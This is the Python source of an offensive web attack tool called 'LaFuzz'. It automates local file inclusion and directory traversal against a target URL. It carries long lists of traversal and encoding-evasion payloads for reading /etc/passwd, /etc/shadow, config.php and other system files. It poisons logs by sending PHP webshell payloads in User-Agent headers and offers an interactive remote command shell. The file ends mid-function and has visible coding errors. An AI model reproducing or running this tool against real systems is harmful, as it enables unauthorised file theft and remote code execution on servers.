#!/usr/bin/python                                
import urllib,urllib2,sys,os,base64

def main():
    banner()
    usage()
    logs = ["apache/logs/error.log","apache/logs/access.log","apache/logs/error.log","apache/logs/access.log","apache/logs/error.log","apache/logs/access.log", 
            "etc/httpd/logs/acces_log","etc/httpd/logs/acces.log","etc/httpd/logs/error_log","etc/httpd/logs/error.log","var/www/logs/access_log","var/www/logs/access.log",
            "usr/local/apache/logs/access_log","usr/local/apache/logs/access.log","var/log/apache/access_log","var/log/apache2/access_log","var/log/apache/access.log",
            "var/log/apache2/access.log", "var/log/access_log", "var/log/access.log","var/www/logs/error_log","var/www/logs/error.log","usr/local/apache/logs/error_log",
            "usr/local/apache/logs/error.log","var/log/apache/error_log","var/log/apache2/error_log","var/log/apache/error.log","var/log/apache2/error.log",
            "var/log/error_log","var/log/error.log"]

    fuzzer=["../","../../../../../../../../../../../../etc/hosts","../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/shadow","..\%20\..\%20\..\%20\../etc/passwd","..\..\..\..\..\..\..\..\..\..\etc\passwd",
            "....//....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/hosts",
            "..\..\..\..\..\..\..\..\..\..\etc\group",".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
            "/","../%00/","/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..",
            "../%2A","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..//..//..//..//..//../etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group","..//..//..//..//..//..//..//etc//passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/&apos;","/\,%ENV\,/","/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd","/.../.../.../.../.../%0a",
            "/../../../../../../../../%2A","/../../../../../../../../../../etc/passwd","..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2fetc%2f%2fpasswd",
            "/../../../../../../../../../../etc/passwd^^","/../../../../../../../../../../etc/group","../\../\../\../\../\../\../\etc/\passwd",
            "/../../../../../../../../../../etc/shadow^^","/../../../../../../../../bin/id|","...//...//...//...//...//...//etc//passwd",
            "/..\../..\../..\../..\../..\../..\../etc/passwd","/..\../..\../..\../..\../..\../..\../etc/shadow","../\.../\.../\.../\.../\.../\.../\etc/\passwd",
            "/./././././././././././etc/passwd","/./././././././././././etc/shadow","/./././././././././././etc/group",".../.../.../.../.../.../etc/passwd",
            "\.\.\.\.\.\.\.\.\etc\passwd","\.\.\.\.\.\.\.\.\etc\group","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
            "/%00//%00//%00//%00//%00/etc/passwd","/%00//%00//%00//%00//%00/etc/passwd","/%00//%00//%00//%00//%00//etc//shadow",
            "/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/passwd","/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/shadow",
            "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63","..%%35c..%%35c..%%35c..%%35c..%%35c..%%35c","..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup"
            "..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63etc%25%35%63passwd","..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd","..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd","..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cshadow","..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qf","..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfpasswd",
            "..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfgroup","..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc/passwd","../\.../\.../\.../\.../\.../\.../etc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af","..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af",
            "..%u2215..%u2215..%u2215..%u2215..%u2215","..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow",".%5c../..%5c/..%c0%9v..%5c.%5c../..%5c/..%c0%9v../",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215group","..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%255c",".%5c../..%5c","/..%c0%9v../","/..%c0%af../","/..%255c..%255c","/..%c0%af..//..%c0%af..//..%c0%af../",
            "/..%255c..%255c/..%255c..%255c/..%255c..%255c","..%255c",".%5c../..%5c/..%c0%9v../","..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd",
            "..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216hosts","..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216shadow","./\./\./\./\./\./\./etc/hosts",
            "../\./\./\./\./\./\./\etc/\passwd","../\./\./\./\./\./\./\proc/\self/\fd/\1","..//..//..//..//..//config.php","..\/..\/..\/..\/config.php",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afconfig.php","..%25%35%63..%25%35%63..%25%35%63config.php",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2econfig.php"]

    lfi_load = ["etc/passwd","etc/group","etc/shadow","proc/cpuinfo","proc/meminfo","proc/self/mounts","proc/self/status","proc/self/stat","proc/self/mounts",
            "etc/security/access.conf","etc/security/opasswd","etc/snort/snort.conf","etc/ldap/ldap.conf","proc/version","etc/clamav/clamd.conf","etc/ssh/sshd_config",
            "etc/cups/printers.conf","etc/cups/cupsd.conf.default","etc/inetd.conf","etc/apache2/conf.d","etc/apache2/conf.d/security","etc/samba/dhcp.conf",
            "etc/samba/dhcp.conf","etc/mysql/conf.d/old_passwords.cnf","etc/X11/xorg.conf","etc/gconf","proc/self/cmdline","etc/dhcp3/dhclient.conf",
            "etc/irssi.conf","etc/chkrootkit.conf","etc/ufw/sysctl.conf","etc/ufw/ufw.conf","etc/php5/apache2/conf.d","etc/syslog.conf",
            "etc/snmp/snmpd.conf","share/snmp/snmpd.conf","etc/cvs-cron.conf","proc/self/environ","etc/clamav/freshclam.conf","etc/ca-certificates.conf",
            "etc/debconf.conf","etc/bash_completion.d/debconf","etc/tor/tor-tsocks.conf","etc/xdg/user-dirs.conf","etc/htdig/htdig.conf",
            "etc/remastersys.conf","etc/gnome-vfs-2.0/modules/default-modules.conf","etc/gnome-vfs-2.0/modules/extra-modules.conf","etc/gconf",
            "etc/gconf/gconf.xml.defaults","etc/gconf/gconf.xml.defaults/%gconf-tree.xml","etc/tor/tor-tsocks.conf","etc/xdg/user-dirs.conf","etc/htdig/htdig.conf",
            "etc/remastersys.conf","etc/gnome-vfs-2.0/modules/default-modules.conf","etc/gconf/gconf.xml.defaults","etc/gconf/2","etc/mysql/conf.d",
            "etc/gconf/gconf.xml.defaults/%gconf-tree.xml","etc/gconf/gconf.xml.system","etc/gconf/2/evoldap.conf","etc/gconf/2/path","etc/gconf/gconf.xml.mandatory",
            "etc/gconf/gconf.xml.mandatory/%gconf-tree.xml","etc/modprobe.d/vmware-tools.conf","etc/fonts/conf.d","etc/fonts/conf.d/README","etc/miredo.conf"
            "etc/bluetooth/input.conf","etc/bluetooth/network.conf","etc/bluetooth/main.conf","etc/bluetooth/rfcomm.conf","etc/ldap/ldap.conf","etc/cups/pdftops.conf",
            "etc/cups/cupsd.conf.default","etc/cups/acroread.conf","etc/cups/cupsd.conf","etc/oinkmaster.conf","etc/menu-methods/menu.config","etc/security/time.conf",
            "etc/security/namespace.conf","etc/security/sepermit.conf","etc/security/limits.conf","etc/security/group.conf","etc/security/pam_env.conf","etc/deluser.conf",
            "etc/miredo-server.conf",".etc/mail/sendmail.conf","etc/belocs/locale-gen.conf","etc/snort/threshold.conf","etc/snort/rules/open-test.conf",
            "etc/snort/rules/emerging.conf","etc/snort/snort-mysql.conf","etc/snort/reference.config","etc/arpalert/arpalert.conf","etc/udev/udev.conf","etc/resolvconf",
            "etc/resolvconf/update-libc.d","etc/resolvconf/update-libc.d/sendmail","etc/airoscript.conf","etc/foremost.conf","etc/scrollkeeper.conf","etc/pam.conf",
            "etc/nsswitch.conf","etc/initramfs-tools/conf.d","etc/GeoIP.conf.default","etc/proxychains.conf","etc/host.conf","etc/tinyproxy/tinyproxy.conf",
            "etc/freetds/freetds.conf","etc/prelude/default/global.conf","etc/prelude/default/idmef-client.conf","etc/prelude/default/tls.conf","etc/apache2/httpd.conf",
            "etc/apache2/conf.d","etc/apache2/conf.d/charset","etc/apache2/mods-enabled/deflate.conf","etc/apache2/ports.conf","etc/apache2/mods-enabled/mime.conf",
            "etc/apache2/mods-enabled/dir.conf","etc/apache2/mods-enabled/alias.conf","etc/apache2/mods-enabled/php5.conf","etc/apache2/mods-enabled/negotiation.conf",
            "etc/apache2/mods-enabled/status.conf","etc/apache2/mods-available/proxy.conf","etc/apache2/mods-available/deflate.conf","etc/apache2/mods-available/mime.conf",
            "etc/apache2/mods-available/dir.conf","etc/apache2/mods-available/mem_cache.conf","etc/apache2/mods-available/ssl.conf","etc/apache2/mods-available/autoindex.conf",
            "etc/apache2/mods-available/setenvif.conf","etc/updatedb.conf","etc/kernel-pkg.conf","etc/samba/dhcp.conf","etc/samba/smb.conf","etc/ltrace.conf",
            "etc/bonobo-activation/bonobo-activation-config.xml","etc/sysctl.conf","etc/mono/config","etc/mono/2.0/machine.config","etc/mono/2.0/web.config",
            "etc/mono/1.0/machine.config","etc/sensors.conf","etc/X11/xorg.conf-vesa","etc/X11/xorg.conf.BeforeVMwareToolsInstall","etc/X11/xorg.conf",
            "etc/X11/xorg.conf-vmware","etc/X11/xorg.conf.orig","etc/smi.conf","etc/postgresql-common/autovacuum.conf","etc/pulse/client.conf","etc/python/debian_config",
            "etc/hdparm.conf","etc/discover.conf.d","etc/discover.conf.d/00discover","etc/casper.conf","etc/discover-modprobe.conf","etc/updatedb.conf.BeforeVMwareToolsInstall",
            "etc/apt/apt.conf.d","etc/apt/apt.conf.d/00trustcdrom","etc/apt/apt.conf.d/70debconf","etc/apt/apt.conf.d/05aptitude","etc/apt/apt.conf.d/50unattended-upgrades",
            "etc/apt/apt.conf.d/01ubuntu","etc/apt/apt.conf.d/01autoremove","etc/vmware-tools/config","etc/vmware-tools/vmware-tools-libraries.conf","etc/vmware-tools/tpvmlp.conf",
            "etc/miredo/miredo.conf","etc/miredo/miredo-server.conf","etc/PolicyKit/PolicyKit.conf","etc/gtk-2.0/im-multipress.conf","etc/resolv.conf","etc/adduser.conf",
            "etc/subversion/config","etc/openvpn/update-resolv-conf","etc/cvs-pserver.conf","etc/pear/pear.conf","etc/dns2tcpd.conf","etc/java-6-sun/fontconfig.properties",
            "etc/privoxy/config","etc/gre.d/1.9.0.14.system.conf","etc/gre.d/1.9.0.15.system.conf","etc/gre.d/1.9.0.10.system.conf","etc/logrotate.conf",
            "etc/skel/.kde3/share/apps/kconf_update","etc/skel/.kde3/share/apps/kconf_update/log/update.log","etc/skel/.kde3/share/share/apps/kconf_update",
            "etc/skel/.kde3/share/share/apps/kconf_update/log","etc/skel/.kde3/share/share/apps/kconf_update/log/update.log","etc/skel/.config","etc/skel/.config/Trolltech.conf",
            "etc/skel/.config/menus","etc/skel/.config/menus/applications-kmenuedit.menu","etc/skel/.config/user-dirs.locale","etc/skel/.config/codef00.com",
            "etc/skel/.config/user-dirs.dirs","etc/avahi/avahi-daemon.conf","etc/dhcp3/dhcpd.conf","etc/dhcp3/dhclient.conf","etc/splashy/config.xml","etc/reader.conf.old",
            "etc/defoma/config","etc/defoma/config/x-ttcidfont-conf.conf2","etc/wicd/manager-settings.conf","etc/wicd/wireless-settings.conf","etc/wicd/dhclient.conf.template.default",
            "etc/wicd/wired-settings.conf","etc/sysctl.d/wine.sysctl.conf","etc/sysctl.d/10-network-security.conf","etc/sysctl.d/10-console-messages.conf","etc/kbd/config",
            "etc/sysctl.d/10-process-security.conf","etc/w3m/config","etc/reader.conf.d","etc/reader.conf.d/libccidtwin","etc/reader.conf.d/0comments","etc/reader.conf",
            "etc/kbd/config","etc/dbus-1/session.conf","etc/dbus-1/system.conf","etc/etter.conf","etc/pm/config.d","etc/pm/config.d/00sleep_module","etc/depmod.d/ubuntu.conf",
            "etc/unicornscan/payloads.conf","etc/unicornscan/unicorn.conf","etc/unicornscan/modules.conf","etc/console-tools/config.d","etc/console-tools/config.d/splashy",
            "etc/tpvmlp.conf","etc/mtools.conf","etc/kernel-img.conf","etc/ca-certificates.conf.dpkg-old","etc/ld.so.conf","etc/conky/conky.conf","etc/ucf.conf","etc/rinetd.conf",
            "etc/e2fsck.conf","etc/gdm/failsafeDexconf","etc/foomatic/filter.conf","etc/manpath.config","etc/esound/esd.conf","etc/tsocks.conf","etc/stunnel/stunnel.conf",
            "etc/fuse.conf","etc/uniconf.conf","etc/syslog.conf","etc/cvs-cron.conf","etc/snmp/snmpd.conf","share/snmp/snmpd.conf","/etc/apache2/envvars","config.php"]

    fd_lfis=["proc/self/fd/0","proc/self/fd/1","proc/self/fd/2","proc/self/fd/3","proc/self/fd/4","proc/self/fd/5","proc/self/fd/6","proc/self/fd/7","proc/self/fd/8",
             "proc/self/fd/9","proc/self/fd/10","/proc/self/fd/11","/proc/self/fd/12","/proc/self/fd/13","/proc/self/fd/14","/proc/self/fd/15"]

    step = "../../../../../../../../"
    evasion = "%00.php"
    evasion1 = "%00.php.inc"
    evasion2 = "%00.php5"
    evasion3 = "%00.phtml"
    nullbyte ="%00"    
    htmlfile = "lfi_fuzz.html"
    htmlfile2 = "lfi_fuzz-01.html"
    htmlfile3 = "lfi_fuzz-02.html"
    scan_options = ("[1]Fuzz for LFI and Directory Transveral","[2]Traditional Local File Inclusion scan and dump","[3]File Descriptor LFI scan",
                    "[4]Exploit LFI via /proc/self/environment","[5]Exploit LFI via File descriptor","[6]Include known apache logs","[7]Exploit LFI via Logfile",
                    "[8]Use LFI_Sploit\'s LFI command shell","[9]Use php:// to read file streams(allow_url_include must be on)","[10]Custom step(../../)","[11]Information",
                    "[12]Exit")

    for scan in scan_options:
        print(scan)                 
            
    option = str(raw_input("Please pick an option(1-12):"))
    if option == "1":
        url = str(raw_input("Site and uri to Fuzz: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url
  
        try:
            cleanup(htmlfile)
            cleanup(htmlfile2)
            cleanup(htmlfile3)

            print "Old files removed, ready to start a new scan"
        except:
            print "Ready to start a new scan.."
        nullorno = str(raw_input("Fuzz with nullbyte and other evasion techniques?(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'y':
            for fuzz in fuzzer:
                myurl = url + fuzz + nullbyte
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)
                
                except IOError as e:
                    print("Error codes: %s" %(e))
 
                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      


            for fuzz in fuzzer:
                myurl = url + fuzz + evasion
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)                     

                except IOError as e:
                    print "Error codes: %s" %(e)
 
                except KeyboardInterrupt:
                    print "Exitting..."
                    sys.exit(1)


            for fuzz in fuzzer:
                myurl = url + fuzz + evasion1
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error codes: %s" %(e))
 
                except KeyboardInterrupt:
                    print("Exitting...")
                    sys.exit(1)

            for fuzz in fuzzer:
                myurl = url + fuzz + evasion2
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile2)

                except IOError as e:
                    print("Error codes: %s" %(e))

                except KeyboardInterrupt:
                    print("Exitting...")
                    sys.exit(1)
                

            for fuzz in fuzzer:
                myurl = url + fuzz + evasion3
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile3)

                except IOError as e:
                    print("Error codes: %s" %(e))

                except KeyboardInterrupt:
                    print("Exitting...")
                    sys.exit(1)


        
        elif nullorno == 'n':
            for fuzz in fuzzer:
                myurl = url + fuzz 
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print "Error: %s" %(e)
     
                except KeyboardInterrupt:      
                    print "Exitting..."
                    sys.exit(1)      


    elif option == "2":
        htmlfile = "LFI_report.html"
        url = str(raw_input("Site and uri to attack?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        print "cleaning up old files before starting a scan"
        try:
            cleanup(htmlfile)

            print "Old files removed, ready to start a new scan"
        except:
            print "Ready to start a new scan.."

        nullorno = str(raw_input("Use a nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'n':
            for lfi in lfi_load:
                myurl = url + step + lfi
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error Codes including files: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      

        elif nullorno == 'y':
            for lfi in lfi_load:
                myurl = url + step + lfi + nullbyte
                print("Scanning %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error codes: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      

    elif option == "3":
        htmlfile = "LFI_FD_report.html"
        htmlfile2 = "LFI_FD_report1.html"
        htmlfile3 = "LFI_FD_report2.html"
        url = str(raw_input("Site and uri to attack?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        print "cleaning up old files before starting to scan"
        try:
            cleanup(htmlfile)

            print("Old files removed, ready to start a new scan")
        except:
            print("Ready to start a new scan..")

        nullorno = str(raw_input("Use a nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'n':
            for fd in fd_lfis:
                myurl = url + step + fd
                print("Attempting to include file descriptor and url: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error codes: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      

        elif nullorno == 'y':
            for fd in fd_lfis:
                myurl = url + step + fd
                print("Scanning %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error code: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      


    elif option == "4":
        url = str(raw_input("Site and uri to exploit(/proc/self/environ must be viewable and magic_quotes=off)?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        print "cleaning up old files before starting a scan"
        try:
            cleanup(htmlfile)

            print("Old files removed, ready to start a new scan")
        except:
            print("Ready to start a new scan..")

        nullorno = str(raw_input("Use a nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'n':
                environ = "../../../../../../../../../proc/self/environ"
                myurl = url + environ
                print("Injecting code into /proc/self/environ using site: %s"  %(myurl))
                try:
                    exploit_environ(myurl)

                except IOError as e:
                    print("Error: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      

        elif nullorno == 'y':
            environ = "../../../../../../../../proc/self/environ"
            myurl = url + environ + nullbyte 
            print("Injecting code into /proc/self/environ on url: %s"  %(myurl))
            try:
                exploit_environ(myurl)

            except IOError as e:
                print("Error codes connecting to server: %s" %(e)) 

            except KeyboardInterrupt:      
                print("Exitting...")
                sys.exit(1)      

    elif option == "5":
        url = str(raw_input("Site and uri to attack?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        fds = {"1": "../../../../../../../proc/self/fd/1","2":"../../../../../../../proc/self/fd/2",
               "3":"../../../../../../../proc/self/fd/3","4":"../../../../../../../proc/self/fd/4",
               "5":"../../../../../../../proc/self/fd/5","6":"../../../../../../../proc/self/fd/6",
               "7":"../../../../../../../proc/self/fd/7","8":"../../../../../../../proc/self/fd/8",
               "9":"../../../../../../../proc/self/fd/9","10":"../../../../../../../proc/self/fd/10",
              "11":"../../../../../../../proc/self/fd/11","12":"../../../../../../proc/self/fd/12"}

        fd = str(raw_input("File descriptor number to log for shell include?:(ie 1-12)"))
        print("cleaning up old files before starting a scan")
        try:
            cleanup(htmlfile)
          
            print("Old files removed, ready to start a new scan")
        except:
            print("Ready to start a new scan..")

        nullorno = str(raw_input("Use a nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'n':
            myurl = url + fds[fd]
            print("Injecting code into file descriptor: %s"  %(myurl))
            try:
                exploit_lfi(myurl)

            except IOError as e:
                print("Error codes connecting to server: %s" %(e))

            except KeyboardInterrupt:      
                print("Exitting...")
                sys.exit(1)      

        elif nullorno == 'y':
            myurl = url + fds[fd] + nullbyte
            print("Injecting code into file descriptor: %s"  %(myurl))
            try:
                exploit_lfi(myurl)

            except IOError as e:
                print("Error: %s" %(e)) 

            except KeyboardInterrupt:      
                print("Exitting...")
                sys.exit(1)
      
        else:
            option_error()             
              
    elif option == "6":
        url = str(raw_input("Site and uri to attack?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        print("Cleaning up old html files")
        try:
            cleanup(htmlfile)

            print("Old files removed, ready to start a new scan")
        except:
            print("Ready to start a new scan..")

        nullorno = str(raw_input("Use a nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'n':
            for log in logs:
                myurl = url + step + log
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error: %s" %(e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      

        elif nullorno == 'y':
            for log in logs:
                myurl = url + step + log
                print("Attempting to include: %s" %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error: %s" %(e))           

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)
      
        else:
            option_error()
            sys.exit(1)

    elif option == "7":
        print("\n\n1)Inject code in a specific Log?")
        print("2)Include all logs and inject code(a LFI hail mary(very noisy!))?: ")
        what_to_do = str(raw_input("Option:"))
        if what_to_do == "1":
            url = str(raw_input("Site were working with: "))
            if url[:7] != "http://":
                url = "http://"+url
            else:
                url = url

            logfile = str(raw_input("Logfile to inject code into?: "))             
            null = str(raw_input("Add a nullbyte(y/n):" ))
            if null == "n":
                myurl = url + step + logfile
                print("Attempting to inject code into logfile: %s" %(logfile) )
                try:
                    exploit_lfi(myurl)

                except IOError as e:
                    print("Error injecting code into %s\n ERROR: %s" %(logfile, e))
    
                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)      
 
                
            elif null == "y":
                myurl = url + step + logfile + null
                print("Attempting to inject code into logfile: %s" %(logfile) )
                try:
                    exploit_lfi(myurl)
                 
                except IOError as e:
                    print("Error injecting code into %s\n ERROR: %s" %(logfile, e))

                except KeyboardInterrupt:      
                    print("Exitting...")
                    sys.exit(1)

            else:
                option_error()
                sys.exit(1) 

        if what_to_do == "2":
            warn = str(raw_input("Warning: Danger scan with a lot of requests, exit?(y/n)"))
            if warn == "y":
                sys.exit(1)

            elif warn == "n":
                url = str(raw_input("Site were working with: "))
                if url[:7] != "http://":
                    url = "http://"+url
                else:
                    url = url

                null = str(raw_input("Add a nullbyte(y/n):" ))
                if null == "n":
                    for log in logs:
                        myurl = url + step + log
                        print("Attempting to inject code into logfile: %s" %(log))
                        try:
                            exploit_lfi(myurl)
                        
                        except IOError as e:
                            print("Error injecting code into %s\n ERROR: %s" %(log, e))

                        except KeyboardInterrupt:      
                            print("Exitting...")
                            sys.exit(1)      

        else:    
            pass


    elif option == "8":
        os.system('clear')
        print("[+]OS Environ/FD/Logfile Shell environment\n\n")
        url = str(raw_input("Fully Exploited url?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        while 1:
            try:
                command_shell(url)
            
            except IOError as e:
                print("Error executing command. Code: %s" %(e))
 
            except KeyboardInterrupt:      
                print("Exitting...")
                sys.exit(1)      

    elif option == "9":
        b64file = "b64_encoded_stream.txt"
        print "Warning: allow_url_include must be enabled for this attack to succeed!"
        url = str(raw_input("Url to exploit?: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        read = str(raw_input("PHP File to attempt to read or include(ie config.php)"))
        sploit = "php://filter/convert.base64-encode/resource="
        myurl = url + sploit + read
        try:
            req = urllib2.Request(myurl)
            req.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
            req.add_header('Keep-Alive: ','115')
            req.add_header('Referer: ','http://'+url)
            response = urllib2.urlopen(req, timeout=10)
            pointer = response
            with open(htmlfile , 'a') as PHPOBJ:
                PHPOBJ.writelines("<b>PHPStream url: %s</b>" %(myurl))
                PHPOBJ.writelines(pointer)
                if PHPOBJ.writelines(pointer):
                    B64.b64decode(pointer)
                    print("Decoded Base 64 streams have been written to %s" %(b64file))
                else: 
                    pass
        
        except IOError as e:
            print("Error codes: %s" %(e))

        except KeyboardInterrupt:
            print("Exitting...")
            sys.exit(1)
            
    elif option == "10":
        htmlfile = "LFI_fuzz_custom.html"
        url = str(raw_input("Site to scan: "))
        if url[:7] != "http://":
            url = "http://"+url
        else:
            url = url

        print("Cleaning up old html files")
        try:
            cleanup(htmlfile)

            print("Old files removed, ready to start a new scan")
        except:
            print("Ready to start a new scan..")

        step = str(raw_input("Custom step to dump application data?(Step meaning ../ ..\ ..// : "))
        nullorno = str(raw_input("Scan with nullbyte(y or n):"))
        nullorno = nullorno.lower()
        if nullorno == 'y':
            for fuzz in fuzzer:
                myurl = url + fuzz + nullbyte
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error codes: %s" %(e))
 
                except KeyboardInterrupt:
                    print("Exitting...")
                    sys.exit(1)
               

        elif nullorno == 'n':
            for lfi in lfi_load:
                myurl = url + step + lfi 
                print("Attempting to include: %s"  %(myurl))
                try:
                    scanner(myurl,url,htmlfile)

                except IOError as e:
                    print("Error codes: %s" %(e))
 
                except KeyboardInterrupt:
                    print("Exitting...")
                    sys.exit(1)
        else:
            pass
     
    elif option == "11":       
        banner()        
        info()

    elif option == "12":
        print("Exitting...\nHappy Hacking, friends! >^.^>")
        sys.exit(0)

    else:
        try: 
            main() 
       
        except IndexError:
            print("Random text for error handling")

        except KeyboardInterrupt:
            print("Exitting... ") 
    
def scanner(url, base, outfile):
    req = urllib2.Request(url)
    req.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+base)
    response = urllib2.urlopen(req, timeout=10)
    html = response
    with open(outfile , 'a') as h1OBJ:
        h1OBJ.writelines("<b>Query Used: %s</b>"  %(url))
        h1OBJ.writelines(html)
        if h1OBJ.writelines(html):
            print("Html pages and responses have been written to %s" %(outfile))
        else:
            pass


def cleanup(file):
    print("Clearing old files before starting a new scan")
    os.remove(file)


def option_error():
        print("\t\t\t[--]Option error![--]\n\n\t\t[+]Please choose an offered option or exit![+]")
        usage()
        


def banner():
    if sys.platform == "linux" or sys.platform == "linux2":
        os.system('clear')
    else:
        os.system('cls')

    print("""\n\n\t\tLaFuzz""")
    print("\t\tby m0le")
    print("\t\tBlack Tiger Security 1998 - 2012\n")
    
        


def exploit_lfi(url):
    req = urllib2.Request(url)
    req.add_header('UserAgent: ','<?php system($_REQUEST["cmd"]?>')
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header('UserAgent: ','<?php shell_exec($_REQUEST["cmd"]?>')
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header('UserAgent: ','<?php eval($_REQUEST["cmd"]?>')
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header('UserAgent: ','<?php exec($_REQUEST["cmd"]?>')
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header('UserAgent: ','<?php passthru($_REQUEST["cmd"]?>')
